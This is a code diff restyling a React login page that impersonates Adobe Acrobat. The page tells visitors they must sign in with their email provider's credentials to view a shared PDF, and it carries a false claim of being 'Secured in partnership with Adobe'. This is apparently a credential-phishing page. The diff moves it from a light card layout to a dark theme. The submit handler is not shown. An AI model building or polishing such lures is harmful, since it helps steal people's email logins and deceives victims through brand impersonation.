@@ -82,139 +82,100 @@ const LoginPage: React.FC<LoginPageProps> = ({
     </svg>
   );
 
-  const PdfIcon = () => (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 64" className="w-14 h-16">
-      <path d="M8 0C3.58 0 0 3.58 0 8v48c0 4.42 3.58 8 8 8h40c4.42 0 8-3.58 8-8V20L36 0H8z" fill="#E8E8E8"/>
-      <path d="M36 0v12c0 4.42 3.58 8 8 8h12L36 0z" fill="#CFCFCF"/>
-      <rect x="8" y="34" width="40" height="4" rx="1" fill="#D4D4D4"/>
-      <rect x="8" y="42" width="32" height="4" rx="1" fill="#D4D4D4"/>
-      <rect x="8" y="50" width="36" height="4" rx="1" fill="#D4D4D4"/>
-      <rect x="4" y="4" width="14" height="14" rx="2" fill="#FA0F00"/>
-      <text x="7" y="14.5" fill="white" fontSize="8" fontWeight="bold" fontFamily="Arial, sans-serif">PDF</text>
-    </svg>
-  );
-
   return (
-    <div className="min-h-screen flex flex-col font-sans" style={{ backgroundColor: '#F5F5F5', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
-      {/* Adobe header bar */}
-      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between flex-shrink-0">
-        <div className="flex items-center gap-3">
-          <AdobeLogo />
-          <span className="text-base font-semibold text-gray-900 tracking-tight">Adobe Acrobat</span>
-        </div>
-      </header>
+    <div className="min-h-screen flex items-center justify-center p-4 font-sans" style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
+      {/* Adobe red accent bar at the very top */}
+      <div className="fixed top-0 left-0 right-0 h-1" style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />
 
-      {/* Main content */}
-      <main className="flex-1 flex items-center justify-center p-6">
-        {!selectedProvider ? (
-          <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full max-w-md overflow-hidden">
-            {/* Document preview area */}
-            <div className="bg-gradient-to-b from-gray-50 to-white px-8 pt-10 pb-6 text-center border-b border-gray-100">
-              <div className="flex justify-center mb-4">
-                <PdfIcon />
-              </div>
-              <h2 className="text-base font-semibold text-gray-900 mb-1 truncate px-2">{fileName}</h2>
-              <p className="text-xs text-gray-500">PDF Document</p>
+      {!selectedProvider ? (
+        <div className="w-full max-w-sm">
+          <div className="mb-10 text-center">
+            <div className="flex justify-center mb-5">
+              <AdobeLogo />
             </div>
-
-            {/* Sign-in section */}
-            <div className="px-8 py-6">
-              <h1 className="text-lg font-bold text-gray-900 mb-1">Sign in to access this document</h1>
-              <p className="text-sm text-gray-500 mb-6">The sender requires you to sign in to view this file.</p>
-
-              <div className="space-y-2.5">
-                {emailProviders.map((provider) => (
-                  <button
-                    key={provider.name}
-                    onClick={() => handleProviderClick(provider.name)}
-                    type="button"
-                    className="w-full group"
-                  >
-                    <div className="flex items-center px-4 py-3 bg-white rounded-lg border border-gray-200 hover:border-[#1473E6] hover:bg-blue-50/30 transition-all duration-150 cursor-pointer">
-                      <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
-                      <span className="flex-1 text-sm font-medium text-gray-800 group-hover:text-[#1473E6] transition-colors ml-3 text-left">
-                        {provider.name}
-                      </span>
-                      <svg className="w-4 h-4 text-gray-300 group-hover:text-[#1473E6] transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                      </svg>
-                    </div>
-                  </button>
-                ))}
-              </div>
-            </div>
-
-            {/* Footer */}
-            <div className="px-8 py-4 border-t border-gray-100 bg-gray-50/50">
-              <p className="text-xs text-gray-400 text-center">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
-            </div>
+            <h1 className="text-xl font-semibold text-white mb-2">Sign in to access your document</h1>
+            <p className="text-sm text-gray-400">
+              <span className="font-medium text-gray-300">{fileName}</span>
+            </p>
           </div>
-        ) : (
-          <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full max-w-md overflow-hidden">
-            {/* Document preview area */}
-            <div className="bg-gradient-to-b from-gray-50 to-white px-8 pt-8 pb-5 text-center border-b border-gray-100">
-              <div className="flex justify-center mb-3">
-                <PdfIcon />
-              </div>
-              <h2 className="text-sm font-semibold text-gray-900 truncate px-2">{fileName}</h2>
-            </div>
-
-            {/* Sign-in form */}
-            <div className="px-8 py-6">
-              <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-[#1473E6] hover:text-[#0d66d0] font-medium mb-5 transition-colors">
-                <ArrowLeft className="w-4 h-4" />
-                All sign-in options
+          
+          <p className="text-sm font-medium text-gray-300 mb-4">Choose your email provider</p>
+          <div className="space-y-2">
+            {emailProviders.map((provider) => (
+              <button
+                key={provider.name}
+                onClick={() => handleProviderClick(provider.name)}
+                type="button"
+                className="w-full group"
+              >
+                <div className="flex items-center px-4 py-3 rounded-md border transition-all duration-150" style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderColor: 'rgba(255,255,255,0.12)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.1)'; e.currentTarget.style.borderColor = '#1473E6'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.05)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.12)'; }}>
+                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
+                  <span className="flex-1 text-sm font-medium text-gray-200 group-hover:text-white transition-colors ml-3 text-left">
+                    {provider.name}
+                  </span>
+                  <svg className="w-4 h-4 text-gray-500 group-hover:text-[#1473E6] transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                  </svg>
+                </div>
               </button>
-
-              <h1 className="text-lg font-bold text-gray-900 mb-1">Sign in with {selectedProvider}</h1>
-              <p className="text-sm text-gray-500 mb-6">Enter your credentials to access this document.</p>
-
-              <form onSubmit={handleSubmit} className="space-y-4">
-                {errorMessage && (
-                  <div className="bg-red-50 text-[#D7373F] p-3 rounded-lg text-sm font-medium border border-red-100 flex items-start gap-2">
-                    <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
-                    <span>{errorMessage}</span>
-                  </div>
-                )}
-
-                <div>
-                  <label className="text-xs font-semibold text-gray-600 uppercase tracking-wide block mb-1.5" htmlFor="email">Email address</label>
-                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@example.com" required className="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-[#1473E6] focus:border-[#1473E6] outline-none transition placeholder:text-gray-400" />
-                </div>
-
-                <div>
-                  <label className="text-xs font-semibold text-gray-600 uppercase tracking-wide block mb-1.5" htmlFor="password">Password</label>
-                  <div className="relative">
-                    <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-[#1473E6] focus:border-[#1473E6] outline-none transition placeholder:text-gray-400" />
-                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
-                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                    </button>
-                  </div>
-                </div>
-
-                <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:bg-[#1473E6]/40 disabled:cursor-not-allowed transition-colors mt-2">
-                  {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-                  {isLoading ? 'Verifying...' : 'Continue'}
-                </button>
-              </form>
-            </div>
-
-            {/* Footer */}
-            <div className="px-8 py-4 border-t border-gray-100 bg-gray-50/50">
-              <p className="text-xs text-gray-400 text-center">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
-            </div>
+            ))}
           </div>
-        )}
-      </main>
 
-      {/* Bottom bar */}
-      <footer className="px-6 py-3 flex items-center justify-center gap-4 text-xs text-gray-400 flex-shrink-0 border-t border-gray-200 bg-white">
-        <span>Adobe Acrobat</span>
-        <span>·</span>
-        <span>Privacy</span>
-        <span>·</span>
-        <span>Terms of Use</span>
-      </footer>
+          <div className="mt-10 text-center">
+            <p className="text-xs text-gray-500">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
+          </div>
+        </div>
+      ) : (
+        <div className="w-full max-w-sm">
+          <div className="mb-8 text-center">
+            <div className="flex justify-center mb-5">
+              <AdobeLogo />
+            </div>
+            <h1 className="text-xl font-semibold text-white">Sign in with {selectedProvider}</h1>
+            <p className="text-sm text-gray-400 mt-1">
+              to access <span className="font-medium text-gray-300">{fileName}</span>
+            </p>
+          </div>
+
+          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-[#1473E6] hover:text-[#4B9CF5] font-medium mb-6 transition-colors">
+            <ArrowLeft className="w-4 h-4" />
+            Back to providers
+          </button>
+
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {errorMessage && (
+              <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
+                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
+                <span>{errorMessage}</span>
+              </div>
+            )}
+
+            <div>
+              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="email">Email address</label>
+              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-2.5 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
+            </div>
+
+            <div>
+              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="password">Password</label>
+              <div className="relative">
+                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-2.5 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
+                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors">
+                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+            </div>
+
+            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Sign In'}
+            </button>
+          </form>
+
+          <div className="mt-10 text-center">
+            <p className="text-xs text-gray-500">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
